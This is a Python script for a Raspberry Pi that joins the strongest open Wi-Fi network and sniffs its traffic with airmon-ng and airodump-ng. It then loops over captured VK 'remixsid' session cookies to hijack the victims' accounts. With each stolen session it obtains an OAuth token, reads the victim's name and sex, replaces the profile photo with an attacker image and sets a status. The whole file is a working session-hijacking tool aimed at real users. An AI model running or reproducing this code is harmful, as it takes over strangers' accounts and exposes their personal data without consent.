#!/usr/bin/env python 

#coding:utf-8
import sys,os,re,time,urllib2
from grab import Grab,UploadFile
from urlparse import urlparse,parse_qs
import json
import threading
import subprocess
import socket
import RPi.GPIO as GPIO

# Wifi cards
ActiveCard = 'wlan3'
MonitorCard = 'wlan2'


# Set GPIO numbures as onboard
GPIO.setmode(GPIO.BOARD)

# Led colors
ORANGE = 13
RED    = 15
GREEN  = 16
BLUE   = 18


# Vk stuff
avatar = '/vk/mantis.jpg'
girl_status = 'test%20status%20API'

# cookie parser param
cookie_file = '/vk/cookie.txt'
delay = 15
used = []

# Grab object 

g = Grab()

################


# Execute iwlan scan and return max signal Open Wifi network
# iwlist.sh Looks like this: sbin/iwlist wlan2 scan | /wifid/essid_parse.py | sed '1d' | grep Open | sort -n | tail -1 
# -- lame part, need to remake

print ('Scan Wifi networks '),

IwObject = subprocess.Popen(['/wifid/iwlist.sh', ActiveCard], stdout=subprocess.PIPE)

# type dots while script exec (3 seconds)
while (IwObject.poll() == None):
	sys.stdout.flush()
	sys.stdout.write(".")
	sys.stdout.flush()
	time.sleep(0.2)
print ''

# stdout from subprocess object to string var
IwRawStdout = IwObject.stdout.read()

if (IwRawStdout != ''):
	# Parse raw string to list
	# IwList[0][0] - BSSID
	# IwList[0][1] - Channel
	# IwList[0][2] - ESSID
	IwList = re.findall(' ?[0-9]{1,3} *(.*?)   ([0-9]{1,2}?) *Open *"(.*?)"',IwRawStdout)

	print 'Target network is: "' + IwList[0][2] + '"' 
	print 'BSSID: ' +IwList[0][0]
	print  'Channel: ' +IwList[0][1]


	# ORANGE get ready to count
	GPIO.setup(ORANGE, False)
	time.sleep(1)
	GPIO.setup(ORANGE, True)
	time.sleep(1)
	# Blink channel
	for i in xrange(int(IwList[0][1])):
		time.sleep(0.2)
		GPIO.setup(GREEN, False)
		time.sleep(0.2)
		GPIO.setup(GREEN, True)

else:
	print "Open WiFi not found."
	# light on red
	GPIO.setup(RED, False)
	raw_input('Press enter to die...')
	sys.exit()


########################
# Connect to found Wifi 
########################
ESSID = '"' + IwList[0][2] + '"' # add quotes in case of essid with spaces 
IwConfig = subprocess.Popen("iwconfig " + ActiveCard + " essid -- " + ESSID, shell=True, stdout=subprocess.PIPE)

print ("Configure iwconfig " + ActiveCard + " essid " + ESSID + "..."),

while (IwConfig.poll() == None):
	sys.stdout.flush()
	sys.stdout.write(".")
	sys.stdout.flush()
	time.sleep(0.2)

if (IwConfig.poll() != None):
	if (IwConfig.poll() != 0):
		print IwConfig.poll()	
		print "\nCan't connect to " + ESSID + " via " + ActiveCard + ". iwconfig error." 
		# light on red
		GPIO.setup(RED, False)
		raw_input('Press enter to die...')
		sys.exit()
	else:
		print "Success."




# DHCP request
Dhclient = subprocess.Popen(['dhclient', ActiveCard], stdout=subprocess.PIPE)

print ("DHCP request"),

while (Dhclient.poll() == None):
	sys.stdout.flush()
	sys.stdout.write(".")
	sys.stdout.flush()
	time.sleep(0.2)

if (Dhclient.poll() != None):
	if (Dhclient.poll() != 0):
		print "\nFailed DHCP request." 
		# light on red
		GPIO.setup(RED, False)
		raw_input('Press enter to die...')
	else:
		print 'OK'



# Check if interface have IP address 
Ifconfig = subprocess.Popen(['ifconfig', ActiveCard], stdout=subprocess.PIPE)

print ("Check ifconfig " + ActiveCard + "..."),

while (Ifconfig.poll() == None):
	sys.stdout.flush()
	sys.stdout.write(".")
	sys.stdout.flush()
	time.sleep(0.2)

if (Ifconfig.poll() != None):
	if (Ifconfig.poll() != 0):
		print ActiveCard + " not found" 
		# light on red
		GPIO.setup(RED, False)
		raw_input('Press enter to die...')
		sys.exit()
	else:
		inet_addr = Ifconfig.stdout.read()
		inet_addr = inet_addr.split('\n')
		inet_addr = inet_addr[1].strip()
		if (inet_addr.startswith('inet addr')):
			print  inet_addr
		else:
			print "Looks like DHCP request failed. We have no IP address."
			GPIO.setup(RED, False)
			raw_input('Press enter to die...')
			sys.exit()

# DNS test 
print ("DNS lookup......"),
try:
	dns_query = socket.gethostbyname('zhovner.com')
	if (dns_query == '62.141.49.229'):
		print "OK"
	else:
		print "Mismatch. zhovner.com resolved to: " + dns_query
except socket.gaierror:
	print "FAILED!"
	GPIO.setup(RED, False)
	raw_input('Press enter to die...')
	sys.exit()


# Download test page
print ("Downloading test page...."),
try:

	g.go('http://zhovner.com/ok.txt')
	if (g.response.body == 'OK'):
		print "OK"
	if ('html' in g.response.body):
		print "Found HTML. Splash page?"
	if (g.response.body == '') or (g.response.body == None):
		print "Fail."
		GPIO.setup(RED, False)
		raw_input('Press enter to die...')
		sys.exit()


except grab.error.GrabNetworkError:
	print "Grab Error"
	GPIO.setup(RED, False)
	raw_input('Press enter to die...')
	sys.exit()

# GREEN
GPIO.setup(GREEN, False)

###############
#
# Sniffing initialization
#
###############


# Enable monitor mode on MonitorCard
print ("Switch " + MonitorCard + " into monitor mode..."),

AirMon = subprocess.Popen(['/usr/local/sbin/airmon-ng', 'start', MonitorCard], stdout=subprocess.PIPE)

# type dots while exec
while (AirMon.poll() == None):
	sys.stdout.flush()
	sys.stdout.write(".")
	sys.stdout.flush()
	time.sleep(0.2)

if (AirMon.poll() != None):
	if (AirMon.poll() != 0):
		print "airmon-ng start " + MonitorCard + " FAILED!."
		# light on red
		GPIO.setup(RED, False)
		raw_input('Press enter to die...')
		sys.exit()
	else:
		print "OK"

# Check if mon0 created
print ("Check if mon0 created...."),

IwConfig = subprocess.Popen(['iwconfig', 'mon0'], stdout=subprocess.PIPE)

while (IwConfig.poll() == None):
	sys.stdout.flush()
	sys.stdout.write(".")
	sys.stdout.flush()
	time.sleep(0.2)

if (IwConfig.poll() != None):
	if (IwConfig.poll() != 0):
		print " mon0 not found"
		# light on red
		GPIO.setup(RED, False)
		raw_input('Press enter to die...')
		sys.exit()
	else:
		print "OK"


# Run airodump-ng in screen 
print ("Run airodump-ng in screen...."),
AiroScreen = subprocess.Popen('/usr/bin/screen -d -m -A -S Airodump /usr/local/sbin/airodump-ng --channel ' + IwList[0][1] + ' --bssid ' + IwList[0][0] + ' --output-format pcap -w /wifid/dumps/dump mon0', shell=True, stdout=subprocess.PIPE)

while (AiroScreen.poll() == None):
	sys.stdout.flush()
	sys.stdout.write(".")
	sys.stdout.flush()
	time.sleep(0.2)

if (AiroScreen.poll() != None):
	if (AiroScreen.poll() != 0):
		print "FAIL"
		# light on red
		GPIO.setup(RED, False)
		raw_input('Press enter to die...')
		sys.exit()
	else:
		print "OK"

# wait airodum-ng to create dump file
time.sleep(2)

# Run tail -f in screen 
print ("Run tail -f in screen...."),
TailScreen = subprocess.Popen(['/wifid/tail.sh'], stdout=subprocess.PIPE)

while (TailScreen.poll() == None):
	sys.stdout.flush()
	sys.stdout.write(".")
	sys.stdout.flush()
	time.sleep(0.2)

if (TailScreen.poll() != None):
	if (TailScreen.poll() != 0):
		print "FAIL"
		# light on red
		GPIO.setup(RED, False)
		raw_input('Press enter to die...')
		sys.exit()
	else:
		print "OK"



while True:
	print '~~~~~~~~~~~~'
	file_strings = [re.sub('[^a-zA-Z0-9=]','',x.strip()) for x in open(cookie_file,'r').readlines()]
	file_strings = list(set(file_strings))
	open(cookie_file,'w')
	for f in file_strings:
		sid = f.split('=')[-1]
		if sid in used:
			print 'in used',sid
		else:
			print ("Processing: " + sid)
			try:
				g.setup(cookies={'remixsid': sid})
				g.go('https://oauth.vk.com/authorize?client_id=2971856&scope=1028&display=wap&response_type=token')
				button = re.search('action=(.*")',g.response.body)
				if(button!=None):
					button = button.group().replace('action=','').replace('"','')
					#print "Push the button" + button
					g.go(button)
				else: 
					print "Empty button"
				url = urlparse(g.response.url)
				#print ("URL with access_token: " + g.response.url)
				p = parse_qs(url.fragment)
				token = p['access_token'][0]

				#Get sex and name
				g.go('https://api.vk.com/method/users.get.json?uids=' + p['user_id'][0] + '&fields=sex,&access_token=' + token)
				j = json.loads(g.response.body)
				uid = j['response'][0]['uid']
				sex = j['response'][0]['sex']
				first_name = j['response'][0]['first_name']
				last_name = j['response'][0]['last_name']
				if (sex == 1):
					print "We have a girl!"
				print "http://vk.com/"+ str(uid) + "(Name Here)"

				#Get ProfileUploadServer URL
				g.go('https://api.vk.com/method/photos.getProfileUploadServer.json?access_token='+token)
				j = json.loads(g.response.body)
				#print ("Photo Upload URL: " + j['response']['upload_url'])

				#Multipart POST file
				g.setup(cookies={'remixsid': sid},multipart_post={'photo': UploadFile(avatar)})
				g.go(j['response']['upload_url'])
				j = json.loads(g.response.body)

				#SaveProfilePhoto
				g.go('https://api.vk.com/method/photos.saveProfilePhoto.json?hash=' + j['hash'] + '&photo=' + j['photo'] + '&server=' + str(j['server']) + '&access_token=' + token)
				j = json.loads(g.response.body)
				if (j['response']['saved'] == 1):
					print "Avatar uploaded!"
					GPIO.setup(BLUE, False)
				else: 
					print "Avatar NOT changed"

				#Set status if girl
				g.go('https://api.vk.com/method/status.set.json?text=' + girl_status + '&access_token=' + token)
				j = json.loads(g.response.body)
				if (j['response'] == 1):
					print "Status " + girl_status + " set."
					GPIO.setup(ORANGE, False)
				else:
					print "Status NOT set."
				print " "
			except Exception, err:
				print "Exception catched"
				print "Errno: " + str(err.errno)
				print "Error message: " + str(err.message)
				print "Str Error: " + str(err.strerror)

			time.sleep(2)
			GPIO.setup(BLUE, True)
			GPIO.setup(ORANGE, True)
			used.append(sid)
		#print f, len(f),type(f)
	
	time.sleep(delay)
